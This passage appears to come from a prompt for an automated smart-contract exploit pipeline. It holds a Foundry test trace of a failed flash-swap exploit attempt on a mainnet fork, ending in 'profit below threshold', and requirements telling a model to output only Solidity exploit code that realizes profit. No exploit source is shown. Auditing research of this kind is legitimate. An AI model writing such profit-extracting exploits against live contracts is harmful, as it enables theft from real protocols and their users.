    │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [252] 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f::weth() [staticcall]
    │   │   │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 50000000000000000 [5e16]
    │   │   │   └─ ← [Revert] insufficient repayment balance
    │   │   └─ ← [Revert] insufficient repayment balance
    │   └─ ← [Stop]
    ├─ [412] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14460635 [1.446e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 334.84ms (50.67ms CPU time)

Ran 1 test suite in 363.91ms (334.84ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 565779)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
